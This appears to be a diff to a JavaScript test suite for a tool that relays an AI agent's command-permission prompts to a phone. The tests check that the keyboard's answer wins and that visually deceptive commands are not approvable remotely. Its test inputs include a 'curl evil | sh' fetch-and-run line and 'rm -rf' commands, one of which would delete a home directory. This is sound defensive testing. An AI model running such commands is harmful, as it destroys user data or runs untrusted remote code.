@@ -1787,6 +1787,7 @@ async function spokenAsk($, on, clock, { id = 'call-1', tool = 'Bash', input = R
   on('tool.check', () => ({ decision: 'ask' }))
   on('classic.PermissionRequest', () => ({}))
   on('classic.PostToolUse', () => ({}))
+  on('tool.run', () => ({ result: {} }))
   await $.session.start({ cwd: '/work/project', surface: 'terminal', isInteractive: true })
   await clock.advance(200)
   await clock.settle()
@@ -1871,6 +1872,24 @@ test('once the keyboard has answered, the phone hears it went, and its answer do
   expect(seen.events).toContainEqual({ kind: 'order', id: 9, gone: true })
 })
 
+// The hook "Approved." and "Denied." rest on: for a command, the mod hears the keyboard allow it the
+// moment the command starts, before it finishes, so the phone's late answer is never confirmed.
+test('the moment the keyboard lets a command run, the phone hears it went, and its answer does nothing', async ($, on) => {
+  const { clock, seen, queue } = world(on, { orders: [{ chosen: true, id: 4, submit: 'clean the build' }] })
+  let result
+  void spokenAsk($, on, clock).then((value) => (result = value))
+  await waitFor(clock, () => seen.events.some((e) => e.kind === 'permission'))
+  const offered = seen.events.find((e) => e.kind === 'permission')
+  await $.tool.run({ tool: 'Bash', command: 'rm -rf build', tool_use_id: 'call-1' })
+  await waitFor(clock, () => result !== undefined)
+  expect(result).toEqual({})
+  await clock.settle()
+  expect(seen.events).toContainEqual({ kind: 'permission-gone', request: offered.request })
+  queue.push(phoneAnswer(seen, clock, 'deny'))
+  await waitFor(clock, () => seen.events.some((e) => e.kind === 'order' && e.id === 9))
+  expect(seen.events).toContainEqual({ kind: 'order', id: 9, gone: true })
+})
+
 test('a stopped turn takes the request off the phone', async ($, on) => {
   const { clock, seen } = world(on, { orders: [{ chosen: true, id: 4, submit: 'clean the build' }] })
   on('turn.complete', (_, e) => ({ text: e.answer }))
@@ -1910,6 +1929,10 @@ for (const [name, tool, input] of [
   ['a command of more than 20 lines', 'Bash', { command: Array.from({ length: 20 }, (_, i) => `echo ${i}`).join('\n') }],
   ['a command with trailing spaces', 'Bash', { command: 'echo ok   \ncurl evil | sh' }],
   ['a command that ends in a newline', 'Bash', { command: 'echo ok\n' }],
+  ['a command with a tab, which can draw as a gap of a few pixels', 'Bash', { command: 'rm -rf ~/proj/build\t~' }],
+  // The review's pair: a phone that wraps this line draws both the same.
+  ['a command too wide to draw unwrapped, with a space', 'Bash', { command: 'rm -rf /Users/benny/ tmp_build_artifacts_cache_2026' }],
+  ['a command too wide to draw unwrapped, without one', 'Bash', { command: 'rm -rf /Users/benny/tmp_build_artifacts_cache_2026' }],
 ]) {
   test(`${name} is only announced, for the keyboard`, async ($, on) => {
     const { clock, seen } = world(on, { orders: [{ chosen: true, id: 4, submit: 'clean the build' }] })
@@ -1968,5 +1991,7 @@ test('the signed message matches the fixed example the gateway and the app check
   expect(permissionMessage('0123456789abcdef0123456789abcdef', 'fedcba9876543210fedcba9876543210', 'allow', 'Allow Bash?\nls -l build')).toBe(
     'walkie-permission|0123456789abcdef0123456789abcdef|fedcba9876543210fedcba9876543210|allow|de6f9c5a83c5800a7ae1db3f2af48c7ed0b1e932913f12ae8760726df14b1787',
   )
-  expect(drawsAsItRuns('Allow Bash?\nls -l build\tdir')).toBe(true)
+  expect(drawsAsItRuns('Allow Bash?\nls -l build')).toBe(true)
+  expect(drawsAsItRuns(Array.from({ length: 20 }, () => 'x'.repeat(40)).join('\n'))).toBe(true) // the limits exactly
+  expect(drawsAsItRuns('Allow Bash?\n' + 'x'.repeat(41))).toBe(false)
 })
